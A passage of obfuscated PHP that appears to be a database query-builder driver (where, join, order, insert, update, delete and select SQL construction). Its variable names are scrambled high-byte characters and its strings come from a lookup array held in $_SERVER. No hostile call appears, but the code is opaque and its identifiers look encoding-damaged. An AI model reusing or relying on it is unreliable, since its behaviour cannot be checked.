(empty($¡œşõå™)) { return !1; } $Îò¯úê™ = parse_url($¡œşõå™); if ($Îò¯úê™[$”™‹Åİ[180]]) { $‹‰Á¬ıı = array($”™‹Åİ[961] => $Îò¯úê™[$”™‹Åİ[180]], $”™‹Åİ[887] => isset($Îò¯úê™[$”™‹Åİ[600]]) ? $Îò¯úê™[$”™‹Åİ[600]] : $”™‹Åİ[12], $”™‹Åİ[888] => isset($Îò¯úê™[$”™‹Åİ[985]]) ? $Îò¯úê™[$”™‹Åİ[985]] : $”™‹Åİ[12], $”™‹Åİ[885] => isset($Îò¯úê™[$”™‹Åİ[181]]) ? $Îò¯úê™[$”™‹Åİ[181]] : $”™‹Åİ[12], $”™‹Åİ[886] => isset($Îò¯úê™[$”™‹Åİ[182]]) ? $Îò¯úê™[$”™‹Åİ[182]] : $”™‹Åİ[12], $”™‹Åİ[21] => isset($Îò¯úê™[$”™‹Åİ[84]]) ? substr($Îò¯úê™[$”™‹Åİ[84]], 1) : $”™‹Åİ[12]); } else { preg_match($”™‹Åİ[986], trim($¡œşõå™), $á©¸¹¿Â); $‹‰Á¬ıı = array($”™‹Åİ[961] => $á©¸¹¿Â[1], $”™‹Åİ[887] => $á©¸¹¿Â[2], $”™‹Åİ[888] => $á©¸¹¿Â[3], $”™‹Åİ[885] => $á©¸¹¿Â[4], $”™‹Åİ[886] => $á©¸¹¿Â[5], $”™‹Åİ[21] => $á©¸¹¿Â[6]); } $‹‰Á¬ıı[$”™‹Åİ[916]] = $”™‹Åİ[12]; return $‹‰Á¬ıı; } protected function debug() { $ºÉ¾…É¼ =& $_SERVER[ßğøİ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ºÉ¾…É¼[987]; if (think_config($ºÉ¾…É¼[988])) { think_status($ºÉ¾…É¼[989]); think_trace($this->queryStr . $ºÉ¾…É¼[990] . think_status($ºÉ¾…É¼[24], $ºÉ¾…É¼[989], 6) . $ºÉ¾…É¼[991], $ºÉ¾…É¼[12], $ºÉ¾…É¼[992]); } } protected function parseLock($Ø¸ºşˆ = false) { $ã¥ÙÑö˜ =& $_SERVER[ßğøİ]; if (!$Ø¸ºşˆ) { return $ã¥ÙÑö˜[12]; } if ($ã¥ÙÑö˜[918] == $this->dbType) { return $ã¥ÙÑö˜[993]; } return $ã¥ÙÑö˜[994]; } protected function parseSet($”æ¸¬¥Ï) { $¼ÂÙÏÖø =& $_SERVER[ßğøİ]; foreach ($”æ¸¬¥Ï as $ş’Œî½ => $ÖõñÑ´Ë) { if (is_array($ÖõñÑ´Ë) && $¼ÂÙÏÖø[297] == $ÖõñÑ´Ë[0]) { $·¿Á†÷[] = $this->parseKey($ş’Œî½) . $¼ÂÙÏÖø[883] . $ÖõñÑ´Ë[1]; } elseif (is_scalar($ÖõñÑ´Ë) || is_null($ÖõñÑ´Ë)) { $·¿Á†÷[] = $this->parseKey($ş’Œî½) . $¼ÂÙÏÖø[883] . $this->parseValue($ÖõñÑ´Ë); } } return $¼ÂÙÏÖø[995] . implode($¼ÂÙÏÖø[50], $·¿Á†÷); } protected function bindParam($á‹”õİ”, $æ”Úøç™) { $this->bind[$_SERVER[ßğøİ][4] . $á‹”õİ”] = $æ”Úøç™; } protected function parseBind($ëã‰µôû) { $ëã‰µôû = array_merge($this->bind, $ëã‰µôû); $this->bind = array(); return $ëã‰µôû; } function parseKey(&$÷©Úˆ‚‰, $Óóş€‰ù = true) { if ($Óóş€‰ù) { $÷©Úˆ‚‰ = $this->parseKeyCheck($÷©Úˆ‚‰); } return $÷©Úˆ‚‰; } function parseKeyCheck($¢™àÈ¦ì) { $½›©¹±’ =& $_SERVER[ßğøİ]; $¢™àÈ¦ì = trim($¢™àÈ¦ì); if (!preg_match($½›©¹±’[996], $¢™àÈ¦ì)) { think_exception($½›©¹±’[997] . $¢™àÈ¦ì); } return $¢™àÈ¦ì; } protected function parseValue($øÒ±Îãé) { $‡È‘—½å =& $_SERVER[ßğøİ]; if (is_string($øÒ±Îãé)) { $øÒ±Îãé = $‡È‘—½å[957] . $this->escapeString($øÒ±Îãé) . $‡È‘—½å[957]; } elseif (isset($øÒ±Îãé[0]) && is_string($øÒ±Îãé[0]) && strtolower($øÒ±Îãé[0]) == $‡È‘—½å[297]) { $øÒ±Îãé = $this->escapeString($øÒ±Îãé[1]); } elseif (is_array($øÒ±Îãé)) { $øÒ±Îãé = array_map(array($this, $‡È‘—½å[958]), $øÒ±Îãé); } elseif (is_bool($øÒ±Îãé)) { $øÒ±Îãé = $øÒ±Îãé ? $‡È‘—½å[88] : $‡È‘—½å[197]; } elseif (is_null($øÒ±Îãé)) { $øÒ±Îãé = $‡È‘—½å[103]; } return $øÒ±Îãé; } protected function parseField($‰¬ö²‰ø) { $È×ë‰…‚ =& $_SERVER[ßğøİ]; if (is_string($‰¬ö²‰ø) && strpos($‰¬ö²‰ø, $È×ë‰…‚[50])) { $‰¬ö²‰ø = explode($È×ë‰…‚[50], $‰¬ö²‰ø); } if (is_array($‰¬ö²‰ø)) { $ùšì§ºğ = array(); foreach ($‰¬ö²‰ø as $¼ú’°Ãó => $åßí  Ä) { if (!is_numeric($¼ú’°Ãó)) { $ùšì§ºğ[] = $this->parseKey($¼ú’°Ãó, !1) . $È×ë‰…‚[998] . $this->parseKey($åßí  Ä); } else { $ùšì§ºğ[] = $this->parseKey($åßí  Ä); } } $«£‹øõ› = implode($È×ë‰…‚[50], $ùšì§ºğ); } elseif (is_string($‰¬ö²‰ø) && !empty($‰¬ö²‰ø)) { $«£‹øõ› = $‰¬ö²‰ø; } else { $«£‹øõ› = $È×ë‰…‚[188]; } return $«£‹øõ›; } protected function parseTable($ÉùÕñáÔ) { $ÒÙÒš€ =& $_SERVER[ßğøİ]; if (is_array($ÉùÕñáÔ)) { $‡Ñİ«İ = array(); foreach ($ÉùÕñáÔ as $¹‡Ìï‘æ => $Â›µ„òÅ) { if (!is_numeric($¹‡Ìï‘æ)) { $‡Ñİ«İ[] = $this->parseKey($¹‡Ìï‘æ) . $ÒÙÒš€[53] . $this->parseKey($Â›µ„òÅ); } else { $‡Ñİ«İ[] = $this->parseKey($¹‡Ìï‘æ); } } $ÉùÕñáÔ = $‡Ñİ«İ; } elseif (is_string($ÉùÕñáÔ)) { if (strstr($ÉùÕñáÔ, $ÒÙÒš€[53])) { return $ÉùÕñáÔ; } $ÉùÕñáÔ = explode($ÒÙÒš€[50], $ÉùÕñáÔ); array_walk($ÉùÕñáÔ, array($this, $ÒÙÒš€[905])); } return $ÒÙÒš€[899] . trim(implode($ÒÙÒš€[999], $ÉùÕñáÔ), $ÒÙÒš€[385]) . $ÒÙÒš€[899]; } protected function parseWhere($ïÑˆ¼¼¨) { $À™®™¼ü =& $_SERVER[ßğøİ]; $´¹’ûŞ = $À™®™¼ü[12]; if (is_string($ïÑˆ¼¼¨)) { $´¹’ûŞ = $ïÑˆ¼¼¨; } else { $˜˜äÇÜ = isset($ïÑˆ¼¼¨[$À™®™¼ü[1000]]) ? strtoupper($ïÑˆ¼¼¨[$À™®™¼ü[1000]]) : $À™®™¼ü[12]; if (in_array($˜˜äÇÜ, array($À™®™¼ü[1001], $À™®™¼ü[1002], $À™®™¼ü[1003]))) { $˜˜äÇÜ = $À™®™¼ü[53] . $˜˜äÇÜ . $À™®™¼ü[53]; unset($ïÑˆ¼¼¨[$À™®™¼ü[1000]]); } else { $˜˜äÇÜ = $À™®™¼ü[1004]; } foreach ($ïÑˆ¼¼¨ as $€«“¯˜³ => $Éù•ŠÃ“) { $´¹’ûŞ .= $À™®™¼ü[277]; if (is_numeric($€«“¯˜³)) { $€«“¯˜³ = $À™®™¼ü[1005]; } if (0 === strpos($€«“¯˜³, $À™®™¼ü[11])) { $´¹’ûŞ .= $this->parseThinkWhere($€«“¯˜³, $Éù•ŠÃ“); } else { if (!preg_match($À™®™¼ü[1006], trim($€«“¯˜³))) { think_exception(think_lang($À™®™¼ü[1007]) . $À™®™¼ü[4] . $€«“¯˜³); } $¸¯óÍËğ = is_array($Éù•ŠÃ“) && isset($Éù•ŠÃ“[$À™®™¼ü[1008]]); $€«“¯˜³ = trim($€«“¯˜³); if (strpos($€«“¯˜³, $À™®™¼ü[283])) { $ Ö´¼Ëˆ = explode($À™®™¼ü[283], $€«“¯˜³); $¸ûú¾ÕÕ = array(); foreach ($ Ö´¼Ëˆ as $´ù¥Ùôá => $í—¨œğˆ) { $Ü‚ƒ„ = $¸¯óÍËğ ? $Éù•ŠÃ“[$´ù¥Ùôá] : $Éù•ŠÃ“; $¸ûú¾ÕÕ[] = $À™®™¼ü[260] . $this->parseWhereItem($this->parseKey($í—¨œğˆ), $Ü‚ƒ„) . $À™®™¼ü[904]; } $´¹’ûŞ .= implode($À™®™¼ü[1009], $¸ûú¾ÕÕ); } elseif (strpos($€«“¯˜³, $À™®™¼ü[284])) { $ Ö´¼Ëˆ = explode($À™®™¼ü[284], $€«“¯˜³); $¸ûú¾ÕÕ = array(); foreach ($ Ö´¼Ëˆ as $´ù¥Ùôá => $í—¨œğˆ) { $Ü‚ƒ„ = $¸¯óÍËğ ? $Éù•ŠÃ“[$´ù¥Ùôá] : $Éù•ŠÃ“; $¸ûú¾ÕÕ[] = $À™®™¼ü[260] . $this->parseWhereItem($this->parseKey($í—¨œğˆ), $Ü‚ƒ„) . $À™®™¼ü[904]; } $´¹’ûŞ .= implode($À™®™¼ü[1004], $¸ûú¾ÕÕ); } else { $´¹’ûŞ .= $this->parseWhereItem($this->parseKey($€«“¯˜³), $Éù•ŠÃ“); } } $´¹’ûŞ .= $À™®™¼ü[278] . $˜˜äÇÜ; } $´¹’ûŞ = substr($´¹’ûŞ, 0, -strlen($˜˜äÇÜ)); } return empty($´¹’ûŞ) ? $À™®™¼ü[12] : $À™®™¼ü[1010] . $´¹’ûŞ; } protected function parseWhereItem($‹óŒ´ÀÑ, $ííÎ³‡£) { $¶Àú¾÷ó =& $_SERVER[ßğøİ]; $Ğß“ì–ò = $¶Àú¾÷ó[12]; if (is_array($ííÎ³‡£)) { if (is_string($ííÎ³‡£[0])) { $×Œà¿ñ¸ = strtolower($ííÎ³‡£[0]); if (in_array($ííÎ³‡£[0], array($¶Àú¾÷ó[883], $¶Àú¾÷ó[1011], $¶Àú¾÷ó[1012], $¶Àú¾÷ó[1013], $¶Àú¾÷ó[1014], $¶Àú¾÷ó[1015]))) { $Ğß“ì–ò .= $‹óŒ´ÀÑ . $¶Àú¾÷ó[53] . $ííÎ³‡£[0] . $¶Àú¾÷ó[53] . $this->parseValue($ííÎ³‡£[1]); } elseif (preg_match($¶Àú¾÷ó[1016], $ííÎ³‡£[0])) { $Ğß“ì–ò .= $‹óŒ´ÀÑ . $¶Àú¾÷ó[53] . $this->exp[$×Œà¿ñ¸] . $¶Àú¾÷ó[53] . $this->parseValue($ííÎ³‡£[1]); } elseif (preg_match($¶Àú¾÷ó[1017], $ííÎ³‡£[0])) { if (is_array($ííÎ³‡£[1])) { $È—×‹— = isset($ííÎ³‡£[2]) ? strtoupper($ííÎ³‡£[2]) : $¶Àú¾÷ó[1002]; if (in_array($È—×‹—, array($¶Àú¾÷ó[1001], $¶Àú¾÷ó[1002], $¶Àú¾÷ó[1003]))) { $¤ŒÄ¥”¡ = array(); foreach ($ííÎ³‡£[1] as $ôÉÒ¦â) { $¤ŒÄ¥”¡[] = $‹óŒ´ÀÑ . $¶Àú¾÷ó[53] . $this->exp[$×Œà¿ñ¸] . $¶Àú¾÷ó[53] . $this->parseValue($ôÉÒ¦â); } $Ğß“ì–ò .= $¶Àú¾÷ó[260] . implode($¶Àú¾÷ó[53] . $È—×‹— . $¶Àú¾÷ó[53], $¤ŒÄ¥”¡) . $¶Àú¾÷ó[904]; } } else { $Ğß“ì–ò .= $‹óŒ´ÀÑ . $¶Àú¾÷ó[53] . $this->exp[$×Œà¿ñ¸] . $¶Àú¾÷ó[53] . $this->parseValue($ííÎ³‡£[1]); } } elseif ($¶Àú¾÷ó[297] == $×Œà¿ñ¸) { $Ğß“ì–ò .= $¶Àú¾÷ó[902] . $‹óŒ´ÀÑ . $¶Àú¾÷ó[53] . $ííÎ³‡£[1] . $¶Àú¾÷ó[1018]; } elseif (preg_match($¶Àú¾÷ó[1019], $ííÎ³‡£[0])) { $Ğß“ì–ò .= $ííÎ³‡£[0]; } elseif (preg_match($¶Àú¾÷ó[1020], $ííÎ³‡£[0])) { if (isset($ííÎ³‡£[2]) && $¶Àú¾÷ó[297] == $ííÎ³‡£[2]) { $Ğß“ì–ò .= $‹óŒ´ÀÑ . $¶Àú¾÷ó[53] . $this->exp[$×Œà¿ñ¸] . $¶Àú¾÷ó[53] . $ííÎ³‡£[1]; } else { if (is_string($ííÎ³‡£[1])) { $ííÎ³‡£[1] = explode($¶Àú¾÷ó[50], $ííÎ³‡£[1]); } $œË¹¬”« = implode($¶Àú¾÷ó[50], $this->parseValue($ííÎ³‡£[1])); $Ğß“ì–ò .= $‹óŒ´ÀÑ . $¶Àú¾÷ó[53] . $this->exp[$×Œà¿ñ¸] . $¶Àú¾÷ó[902] . $œË¹¬”« . $¶Àú¾÷ó[904]; } } elseif (preg_match($¶Àú¾÷ó[1021], $ííÎ³‡£[0])) { $ø€Åî‡¯ = is_string($ííÎ³‡£[1]) ? explode($¶Àú¾÷ó[50], $ííÎ³‡£[1]) : $ííÎ³‡£[1]; $Ğß“ì–ò .= $¶Àú¾÷ó[902] . $‹óŒ´ÀÑ . $¶Àú¾÷ó[53] . $this->exp[$×Œà¿ñ¸] . $¶Àú¾÷ó[53] . $this->parseValue($ø€Åî‡¯[0]) . $¶Àú¾÷ó[1004] . $this->parseValue($ø€Åî‡¯[1]) . $¶Àú¾÷ó[278]; } else { think_exception(think_lang($¶Àú¾÷ó[1007]) . $¶Àú¾÷ó[4] . $ííÎ³‡£[0]); } } else { $ø„¿öº = count($ííÎ³‡£); $ÃÂŸÛÀÃ = $¶Àú¾÷ó[12]; if (is_string($ííÎ³‡£[$ø„¿öº - 1])) { $ÃÂŸÛÀÃ = isset($ííÎ³‡£[$ø„¿öº - 1]) ? strtoupper($ííÎ³‡£[$ø„¿öº - 1]) : $¶Àú¾÷ó[12]; if (in_array($ÃÂŸÛÀÃ, array($¶Àú¾÷ó[1001], $¶Àú¾÷ó[1002], $¶Àú¾÷ó[1003]))) { $ø„¿öº = $ø„¿öº - 1; } } else { $ÃÂŸÛÀÃ = $¶Àú¾÷ó[1001]; } for ($‘² Ú­¿ = 0; $‘² Ú­¿ < $ø„¿öº; $‘² Ú­¿++) { $ø€Åî‡¯ = is_array($ííÎ³‡£[$‘² Ú­¿]) ? $ííÎ³‡£[$‘² Ú­¿][1] : $ííÎ³‡£[$‘² Ú­¿]; if ($¶Àú¾÷ó[297] == strtolower($ííÎ³‡£[$‘² Ú­¿][0])) { $Ğß“ì–ò .= $¶Àú¾÷ó[260] . $‹óŒ´ÀÑ . $¶Àú¾÷ó[53] . $ø€Åî‡¯ . $¶Àú¾÷ó[1018] . $ÃÂŸÛÀÃ . $¶Àú¾÷ó[53]; } else { $­ò«Š·« = is_array($ííÎ³‡£[$‘² Ú­¿]) ? $this->exp[strtolower($ííÎ³‡£[$‘² Ú­¿][0])] : $¶Àú¾÷ó[883]; if (!$­ò«Š·« && is_array($ííÎ³‡£[$‘² Ú­¿]) && in_array($ííÎ³‡£[$‘² Ú­¿][0], array($¶Àú¾÷ó[883], $¶Àú¾÷ó[1011], $¶Àú¾÷ó[1012], $¶Àú¾÷ó[1013], $¶Àú¾÷ó[1014], $¶Àú¾÷ó[1015]))) { $­ò«Š·« = $ííÎ³‡£[$‘² Ú­¿][0]; } $Ğß“ì–ò .= $¶Àú¾÷ó[260] . $‹óŒ´ÀÑ . $¶Àú¾÷ó[53] . $­ò«Š·« . $¶Àú¾÷ó[53] . $this->parseValue($ø€Åî‡¯) . $¶Àú¾÷ó[1018] . $ÃÂŸÛÀÃ . $¶Àú¾÷ó[53]; } } $Ğß“ì–ò = substr($Ğß“ì–ò, 0, -4); } } else { $Ğß“ì–ò .= $‹óŒ´ÀÑ . $¶Àú¾÷ó[1022] . $this->parseValue($ííÎ³‡£); } return $Ğß“ì–ò; } protected function parseThinkWhere($ÓÈûÜŸ„, $Ÿ³Ë‹) { $ïä÷á =& $_SERVER[ßğøİ]; $å¸µÀ™¯ = $ïä÷á[12]; switch ($ÓÈûÜŸ„) { case $ïä÷á[352]: $å¸µÀ™¯ = $Ÿ³Ë‹; break; case $ïä÷á[1005]: $å¸µÀ™¯ = is_string($Ÿ³Ë‹) ? $Ÿ³Ë‹ : substr($this->parseWhere($Ÿ³Ë‹), 6); break; case $ïä÷á[1023]: parse_str($Ÿ³Ë‹, $¿Ïï²‰Û); if (isset($¿Ïï²‰Û[$ïä÷á[1000]])) { $€ âıÎÈ = $ïä÷á[53] . strtoupper($¿Ïï²‰Û[$ïä÷á[1000]]) . $ïä÷á[53]; unset($¿Ïï²‰Û[$ïä÷á[1000]]); } else { $€ âıÎÈ = $ïä÷á[1004]; } $×ë«Œ¸ô = array(); foreach ($¿Ïï²‰Û as $Ù¡ëæé => $Äö¥ì “) { $×ë«Œ¸ô[] = $this->parseKey($Ù¡ëæé) . $ïä÷á[1022] . $this->parseValue($Äö¥ì “); } $å¸µÀ™¯ = implode($€ âıÎÈ, $×ë«Œ¸ô); break; } return $å¸µÀ™¯; } protected function parseLimit($ÓöôÎ¤ˆ) { $ òõ£ñ =& $_SERVER[ßğøİ]; return !empty($ÓöôÎ¤ˆ) ? $ òõ£ñ[51] . $ÓöôÎ¤ˆ . $ òõ£ñ[53] : $ òõ£ñ[12]; } protected function parseJoin($†ÃÒéğ) { $®ã½ÒÜ™ =& $_SERVER[ßğøİ]; $ö“ÃÏëã = $®ã½ÒÜ™[12]; if (!empty($†ÃÒéğ)) { if (is_array($†ÃÒéğ)) { foreach ($†ÃÒéğ as $²öÓë› => $Ëö˜ï§Î) { if (!1 !== stripos($Ëö˜ï§Î, $®ã½ÒÜ™[1024])) { $ö“ÃÏëã .= $®ã½ÒÜ™[53] . $Ëö˜ï§Î; } else { $ö“ÃÏëã .= $®ã½ÒÜ™[1025] . $Ëö˜ï§Î; } } } else { $ö“ÃÏëã .= $®ã½ÒÜ™[1025] . $†ÃÒéğ; } } $ö“ÃÏëã = preg_replace($®ã½ÒÜ™[1026], think_config($®ã½ÒÜ™[930]) . $®ã½ÒÜ™[1027], $ö“ÃÏëã); return $ö“ÃÏëã; } protected function parseOrder($¾“Ú–´Ú) { $èÌ¬¤òè =& $_SERVER[ßğøİ]; if (is_array($¾“Ú–´Ú)) { $°¶‚¬ó¨ = array(); foreach ($¾“Ú–´Ú as $ÓÂ ÌŞ => $ ‡±îŠÂ) { if (is_numeric($ÓÂ ÌŞ)) { $°¶‚¬ó¨[] = $this->parseKey($ ‡±îŠÂ); } else { $ ‡±îŠÂ = in_array(strtoupper(trim($ ‡±îŠÂ)), array($èÌ¬¤òè[1028], $èÌ¬¤òè[1029])) ? $èÌ¬¤òè[53] . $ ‡±îŠÂ : $èÌ¬¤òè[12]; if (preg_match($èÌ¬¤òè[1030], $ÓÂ ÌŞ)) { $°¶‚¬ó¨[] = $this->parseKey($ÓÂ ÌŞ) . $ ‡±îŠÂ; } else { think_exception($èÌ¬¤òè[1031] . $ÓÂ ÌŞ); } } } $¾“Ú–´Ú = implode($èÌ¬¤òè[50], $°¶‚¬ó¨); } return !empty($¾“Ú–´Ú) ? $èÌ¬¤òè[1032] . $¾“Ú–´Ú : $èÌ¬¤òè[12]; } protected function parseGroup($Ş«›¡) { $ï¤›Èóã =& $_SERVER[ßğøİ]; return !empty($Ş«›¡) ? $ï¤›Èóã[1033] . $Ş«›¡ : $ï¤›Èóã[12]; } protected function parseHaving($¢Úµ÷‡„) { $ÂìÜ·¦§ =& $_SERVER[ßğøİ]; return !empty($¢Úµ÷‡„) ? $ÂìÜ·¦§[1034] . $¢Úµ÷‡„ : $ÂìÜ·¦§[12]; } protected function parseComment($Ó¦†š†ü) { $«Ë¼èõÃ =& $_SERVER[ßğøİ]; return !empty($Ó¦†š†ü) ? $«Ë¼èõÃ[1035] . $Ó¦†š†ü . $«Ë¼èõÃ[1036] : $«Ë¼èõÃ[12]; } protected function parseDistinct($¢¸°ÛÜ) { $ÏŠÀÒ„ø =& $_SERVER[ßğøİ]; return !empty($¢¸°ÛÜ) ? $ÏŠÀÒ„ø[1037] : $ÏŠÀÒ„ø[12]; } protected function parseUnion($™°ë ÃË) { $ºƒ‹–ÄÙ =& $_SERVER[ßğøİ]; if (empty($™°ë ÃË)) { return $ºƒ‹–ÄÙ[12]; } if (isset($™°ë ÃË[$ºƒ‹–ÄÙ[348]])) { $ïŒîÍÕ = $ºƒ‹–ÄÙ[1038]; unset($™°ë ÃË[$ºƒ‹–ÄÙ[348]]); } else { $ïŒîÍÕ = $ºƒ‹–ÄÙ[1039]; } foreach ($™°ë ÃË as $ƒĞŞî¸Î) { $ı¨‰»èä[] = $ïŒîÍÕ . (is_array($ƒĞŞî¸Î) ? $this->buildSelectSql($ƒĞŞî¸Î) : $ƒĞŞî¸Î); } return implode($ºƒ‹–ÄÙ[53], $ı¨‰»èä); } public function insert($ıˆşæ§¹, $ùÑÛÚ¿£ = array(), $ü‰¥ùÚŞ = false) { $¹ıÌİË¤ =& $_SERVER[ßğøİ]; $¡±±×äš = $à §Ø™Å = array(); $this->model = $ùÑÛÚ¿£[$¹ıÌİË¤[281]]; foreach ($ıˆşæ§¹ as $Œª¦€Ã => $ğÑãĞÙ¨) { if (is_array($ğÑãĞÙ¨) && $¹ıÌİË¤[297] == $ğÑãĞÙ¨[0]) { $à §Ø™Å[] = $this->parseKey($Œª¦€Ã); $¡±±×äš[] = $ğÑãĞÙ¨[1]; } elseif (is_scalar($ğÑãĞÙ¨) || is_null($ğÑãĞÙ¨)) { $à §Ø™Å[] = $this->parseKey($Œª¦€Ã); $¡±±×äš[] = $this->parseValue($ğÑãĞÙ¨); } } $­Ä“Ç§ = ($ü‰¥ùÚŞ ? $¹ıÌİË¤[906] : $¹ıÌİË¤[907]) . $¹ıÌİË¤[908] . $this->parseTable($ùÑÛÚ¿£[$¹ıÌİË¤[279]]) . $¹ıÌİË¤[902] . implode($¹ıÌİË¤[50], $à §Ø™Å) . $¹ıÌİË¤[903] . implode($¹ıÌİË¤[50], $¡±±×äš) . $¹ıÌİË¤[904]; $­Ä“Ç§ .= $this->parseLock(isset($ùÑÛÚ¿£[$¹ıÌİË¤[840]]) ? $ùÑÛÚ¿£[$¹ıÌİË¤[840]] : !1); $­Ä“Ç§ .= $this->parseComment(!empty($ùÑÛÚ¿£[$¹ıÌİË¤[354]]) ? $ùÑÛÚ¿£[$¹ıÌİË¤[354]] : $¹ıÌİË¤[12]); return $this->execute($­Ä“Ç§, $this->parseBind(!empty($ùÑÛÚ¿£[$¹ıÌİË¤[285]]) ? $ùÑÛÚ¿£[$¹ıÌİË¤[285]] : array())); } public function selectInsert($çğ¬Ìû’, $¿›ÌÃàÚ, $áíÖó²¸ = array()) { $†«Ã¢Î€ =& $_SERVER[ßğøİ]; $this->model = $áíÖó²¸[$†«Ã¢Î€[281]]; if (is_string($çğ¬Ìû’)) { $çğ¬Ìû’ = explode($†«Ã¢Î€[50], $çğ¬Ìû’); } array_walk($çğ¬Ìû’, array($this, $†«Ã¢Î€[905])); $§¾¿“Æ = $†«Ã¢Î€[1040] . $this->parseTable($¿›ÌÃàÚ) . $†«Ã¢Î€[902] . implode($†«Ã¢Î€[50], $çğ¬Ìû’) . $†«Ã¢Î€[1018]; $§¾¿“Æ .= $this->buildSelectSql($áíÖó²¸); return $this->execute($§¾¿“Æ, $this->parseBind(!empty($áíÖó²¸[$†«Ã¢Î€[285]]) ? $áíÖó²¸[$†«Ã¢Î€[285]] : array())); } public function update($ö„°Ù›¶, $ãÂÑû×) { $Îßº¢¹¿ =& $_SERVER[ßğøİ]; $this->model = $ãÂÑû×[$Îßº¢¹¿[281]]; $×ë‹¨«· = $Îßº¢¹¿[1041] . $this->parseTable($ãÂÑû×[$Îßº¢¹¿[279]]) . $this->parseSet($ö„°Ù›¶) . $this->parseWhere(!empty($ãÂÑû×[$Îßº¢¹¿[275]]) ? $ãÂÑû×[$Îßº¢¹¿[275]] : $Îßº¢¹¿[12]) . $this->parseOrder(!empty($ãÂÑû×[$Îßº¢¹¿[365]]) ? $ãÂÑû×[$Îßº¢¹¿[365]] : $Îßº¢¹¿[12]) . $this->parseLimit(!empty($ãÂÑû×[$Îßº¢¹¿[292]]) ? $ãÂÑû×[$Îßº¢¹¿[292]] : $Îßº¢¹¿[12]) . $this->parseLock(isset($ãÂÑû×[$Îßº¢¹¿[840]]) ? $ãÂÑû×[$Îßº¢¹¿[840]] : !1) . $this->parseComment(!empty($ãÂÑû×[$Îßº¢¹¿[354]]) ? $ãÂÑû×[$Îßº¢¹¿[354]] : $Îßº¢¹¿[12]); return $this->execute($×ë‹¨«·, $this->parseBind(!empty($ãÂÑû×[$Îßº¢¹¿[285]]) ? $ãÂÑû×[$Îßº¢¹¿[285]] : array())); } public function delete($¼ğÒšæÖ = array()) { $ÚÀí¶ü­ =& $_SERVER[ßğøİ]; $this->model = $¼ğÒšæÖ[$ÚÀí¶ü­[281]]; $š¥¦Ôø¹ = $ÚÀí¶ü­[1042] . $this->parseTable($¼ğÒšæÖ[$ÚÀí¶ü­[279]]) . $this->parseWhere(!empty($¼ğÒšæÖ[$ÚÀí¶ü­[275]]) ? $¼ğÒšæÖ[$ÚÀí¶ü­[275]] : $ÚÀí¶ü­[12]) . $this->parseOrder(!empty($¼ğÒšæÖ[$ÚÀí¶ü­[365]]) ? $¼ğÒšæÖ[$ÚÀí¶ü­[365]] : $ÚÀí¶ü­[12]) . $this->parseLimit(!empty($¼ğÒšæÖ[$ÚÀí¶ü­[292]]) ? $¼ğÒšæÖ[$ÚÀí¶ü­[292]] : $ÚÀí¶ü­[12]) . $this->parseLock(isset($¼ğÒšæÖ[$ÚÀí¶ü­[840]]) ? $¼ğÒšæÖ[$ÚÀí¶ü­[840]] : !1) . $this->parseComment(!empty($¼ğÒšæÖ[$ÚÀí¶ü­[354]]) ? $¼ğÒšæÖ[$ÚÀí¶ü­[354]] : $ÚÀí¶ü­[12]); return $this->execute($š¥¦Ôø¹, $this->parseBind(!empty($¼ğÒšæÖ[$ÚÀí¶ü­[285]]) ? $¼ğÒšæÖ[$ÚÀí¶ü­[285]] : array())); } public function select($¡ã¯­©ø = array()) { $äÌšå Ÿ =& $_SERVER[ßğøİ]; $this->model = $¡ã¯­©ø[$äÌšå Ÿ[281]]; $Â°Ô¯Ò‘ = $this->buildSelectSql($¡ã¯­©ø); $µùûØ´® = isset($¡ã¯­©ø[$äÌšå Ÿ[349]]) ? $¡ã¯­©ø[$äÌšå Ÿ[349]] : !1; if ($µùûØ´®) { $ª°«Êæ = is_string($µùûØ´®[$äÌšå Ÿ[94]]) ? $µùûØ´®[$äÌšå Ÿ[94]] : $äÌšå Ÿ[1043] . md5($Â°Ô¯Ò‘); $£ç…ºâ = think_cache($ª°«Êæ, $äÌšå Ÿ[12], $µùûØ´®); if (!1 !== $£ç…ºâ) { return $£ç…ºâ; } } $ÓÑ÷öš = $this->query($Â°Ô¯Ò‘, $this->parseBind(!empty($¡ã¯­©ø[$äÌšå Ÿ[285]]) ? $¡ã¯­©ø[$äÌšå Ÿ[285]] : array())); if ($µùûØ´® && !1 !== $ÓÑ÷öš) { think_cache($ª°«Êæ, $ÓÑ÷öš, $µùûØ´®); } return $ÓÑ÷öš; } public function buildSelectSql($°Œìü‚‹ = array()) { $ƒßÊò =& $_SERVER[ßğøİ]; if (isset($°Œìü‚‹[$ƒßÊò[353]])) { if (strpos($°Œìü‚‹[$ƒßÊò[353]], $ƒßÊò[50])) { list($Úı»ÍÓù, $ÃùÚ³Ù) = explode($ƒßÊò[50], $°Œìü‚‹[$ƒßÊò[353]]); } else { $Úı»ÍÓù = $°Œìü‚‹[$ƒßÊò[353]]; } $Úı»ÍÓù = $Úı»ÍÓù ? $Úı»ÍÓù : 1; $ÃùÚ³Ù = isset($ÃùÚ³Ù) ? $ÃùÚ³Ù : (is_numeric($°Œìü‚‹[$ƒßÊò[292]]) ? $°Œìü‚‹[$ƒßÊò[292]] : 20); $â¥Îû = $ÃùÚ³Ù * ((int) $Úı»ÍÓù - 1); $°Œìü‚‹[$ƒßÊò[292]] = $â¥Îû . $ƒßÊò[50] . $ÃùÚ³Ù; } if (think_config($ƒßÊò[1044])) { $â±ÄÓâ = $ƒßÊò[1045] . md5(serialize($°Œìü‚‹)); $‚îµÍÅÚ = think_cache($â±ÄÓâ); if ($‚îµÍÅÚ) { return $‚îµÍÅÚ; } } $ïÆ£Ğºé = $this->parseSql($this->selectSql, $°Œìü‚‹); $ïÆ£Ğºé .= $this->parseLock(isset($°Œìü‚‹[$ƒßÊò[840]]) ? $°Œìü‚‹[$ƒßÊò[840]] : !1); if (isset($â±ÄÓâ)) { think_cache($â±ÄÓâ, $ïÆ£Ğºé); } return $ïÆ£Ğºé; } public function parseSql($Ş·Şœş², $ˆ÷¤šá¹ = array()) { $•¢‹ï° =& $_SERVER[ßğøİ]; $Ş·Şœş² = str_replace(array($•¢‹ï°[1046], $•¢‹ï°[1047], $•¢‹ï°[1048], $•¢‹ï°[1049], $•¢‹ï°[1050], $•¢‹ï°[1051], $•¢‹ï°[1052], $•¢‹ï°[1053], $•¢‹ï°[1054], $•¢‹ï°[1055], $•¢‹ï°[1056]), array($this->parseTable("{$ˆ÷¤šá¹[$•¢‹ï°[279]]}"), $this->parseDistinct(isset($ˆ÷¤šá¹[$•¢‹ï°[1057]]) ? $ˆ÷¤šá¹[$•¢‹ï°[1057]] : !1), 